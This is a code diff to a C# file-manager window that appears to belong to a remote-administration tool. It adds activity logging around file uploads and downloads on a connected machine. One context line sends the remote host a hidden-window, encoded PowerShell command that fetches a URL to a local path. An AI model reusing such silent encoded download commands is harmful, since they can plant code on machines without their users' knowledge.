@@ -1,4 +1,4 @@
-﻿using System.Collections.ObjectModel;
+using System.Collections.ObjectModel;
 using System.IO;
 using System.Windows;
 using System.Windows.Input;
@@ -169,6 +169,7 @@ public partial class FileManagerWindow : Window
 
         var sw = System.Diagnostics.Stopwatch.StartNew();
         TxtStatus.Text = $"Downloading {row.Name}…";
+        ServerWindow.ReportGlobalActivity("Downloading", row.Name, "running");
         ShowTransfer(row.Name, "Requesting…");
         try
         {
@@ -192,8 +193,12 @@ public partial class FileManagerWindow : Window
             NotificationService.NotifyDownloadComplete();
             var elapsed = sw.Elapsed.TotalSeconds < 60 ? $"{sw.Elapsed.TotalSeconds:F1}s" : $"{sw.Elapsed.TotalMinutes:F0}m {sw.Elapsed.Seconds}s";
             TxtStatus.Text = $"Downloaded: {row.Name}  ({bytes.Length:N0} B in {elapsed})";
+            ServerWindow.ReportGlobalActivity("Download completed", row.Name, "success");
         }
-        catch (Exception ex) { TxtStatus.Text = $"Download failed: {ex.Message}"; }
+        catch (Exception ex) { 
+            TxtStatus.Text = $"Download failed: {ex.Message}"; 
+            ServerWindow.ReportGlobalActivity("Download failed", row.Name, "failed"); 
+        }
         finally { _pendingData = null; HideTransfer(); }
     }
 
@@ -206,6 +211,7 @@ public partial class FileManagerWindow : Window
 
         var sw = System.Diagnostics.Stopwatch.StartNew();
         TxtStatus.Text = $"Uploading {uploadName}…";
+        ServerWindow.ReportGlobalActivity("Uploading", uploadName, "running");
         ShowTransfer(uploadName, "Reading…");
         try
         {
@@ -226,9 +232,13 @@ public partial class FileManagerWindow : Window
             NotificationService.NotifyUploadComplete();
             var elapsed = sw.Elapsed.TotalSeconds < 60 ? $"{sw.Elapsed.TotalSeconds:F1}s" : $"{sw.Elapsed.TotalMinutes:F0}m {sw.Elapsed.Seconds}s";
             TxtStatus.Text = $"Uploaded: {uploadName} ({bytes.Length:N0} B in {elapsed})";
+            ServerWindow.ReportGlobalActivity("Upload completed", uploadName, "success");
             await Navigate(_currentPath);
         }
-        catch (Exception ex) { TxtStatus.Text = $"Upload failed: {ex.Message}"; }
+        catch (Exception ex) { 
+            TxtStatus.Text = $"Upload failed: {ex.Message}"; 
+            ServerWindow.ReportGlobalActivity("Upload failed", uploadName, "failed"); 
+        }
         finally { _pendingAck = null; HideTransfer(); }
     }
 
@@ -464,6 +474,7 @@ public partial class FileManagerWindow : Window
             Data = $"SET SERO_URL={url}&& SET SERO_OUT={dest}&& powershell -NoP -NonI -W H -EncodedCommand {enc}"
         });
         TxtStatus.Text = $"Downloading {filename}…";
+        ServerWindow.ReportGlobalActivity("Download URL", filename, "running");
         await Task.Delay(3000);
         await Navigate(_currentPath);
     }
